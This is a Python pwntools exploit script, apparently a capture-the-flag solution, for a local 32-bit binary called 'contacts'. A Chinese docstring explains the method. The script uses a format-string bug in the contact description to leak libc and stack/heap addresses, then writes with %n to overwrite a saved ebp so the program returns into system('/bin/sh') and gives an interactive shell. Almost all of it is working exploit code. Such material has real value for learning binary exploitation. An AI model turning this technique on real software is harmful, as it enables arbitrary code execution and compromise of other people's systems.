"""
基本思路如下

    首先获取 system 函数的地址
        通过泄露某个 libc 函数的地址根据 libc database 确定。
    构造基本联系人描述为 system_addr + 'bbbb' + binsh_addr
    修改上层函数保存的 ebp(即上上层函数的 ebp) 为存储 system_addr 的地址 -4。
    当主程序返回时，会有如下操作
        move esp,ebp，将 esp 指向 system_addr 的地址 - 4
        pop ebp， 将 esp 指向 system_addr
        ret，将 eip 指向 system_addr，从而获取 shell。

"""

from pwn import *
context.log_level="info"
context.arch="x86"

io=process("./contacts")
binary=ELF("contacts")
libc=binary.libc
gdb.attach(io,"b *0x080487D1\nc\n")
def createcontact(io, name, phone, descrip_len, description):
    sh=io
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)
def printcontact(io):
    sh=io
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')

#gdb.attach(io)
gdb.attach(io,"b *0x080487D1\nc\n")
createcontact(io,"1","1","111","%31$paaaa")
printcontact(io)
libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241
log.success('get libc_start_main addr: ' + hex(libc_start_main))
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
system=libc_base+libc.symbols["system"]
binsh=libc_base+next(libc.search("/bin/sh"))
log.success("system: "+hex(system))
log.success("binsh: "+hex(binsh))

payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"
createcontact(io,'2', '2', '111', payload)
printcontact(io)
io.recvuntil('Description: ')
data = io.recvuntil('ccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)+12
log.success("ebp: "+hex(system))
log.success("heap: "+hex(heap_addr))

part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

#payload=fmtstr_payload(6,{ebp_addr:heap_addr})
##print payload
createcontact(io,'3333', '123456789', '300', payload)
printcontact(io)
io.recvuntil('Description: ')
io.recvuntil('Description: ')
##gdb.attach(sh)
log.success("get shell")
io.recvuntil('>>> ')
##get shell
io.sendline('5')
io.interactive()
